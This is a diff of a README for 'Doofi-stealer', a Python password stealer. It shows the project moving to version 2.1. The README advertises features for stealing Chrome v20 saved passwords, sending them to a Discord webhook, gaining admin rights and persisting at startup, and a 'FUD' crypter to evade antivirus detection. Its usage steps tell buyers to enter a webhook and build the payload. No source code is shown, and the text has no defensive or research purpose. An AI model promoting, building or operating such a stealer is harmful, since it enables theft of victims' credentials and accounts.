@@ -1,13 +1,17 @@
-# Doofi-stealer-discord-FUD  
+# Doofi-stealer-discord-FUD  v2.1
 FUD Stealer in Python, v20 compatible   
+
+![Imgur Image](https://i.imgur.com/ZPK5olE.png)  
+
 # Features  
-**-builder   
--send to discord webhook  
--decrypt chrome's latest v20 passwords  
--FUD (but please encrypt it)  
--run as admin  
--run at startup**  
+**-✅builder   
+-✅send to discord webhook  
+-✅decrypt chrome's latest v20 passwords  
+-✅run as admin  
+-✅run at startup  
+-✅reworked the GUI  
+-✅added options for output file  
+-✅added fud crypter**   
 # Usage  
-![Imgur Image](https://i.imgur.com/4eJma6R.png)  
-Download the ZIP, unpack it, and run the builder **(Stealinator)**  
-With this, you can even control the Tri-State Area XDD
+Download from 'Releases'
+Put in your webhook, select what functions you want to use and click build, thats it.
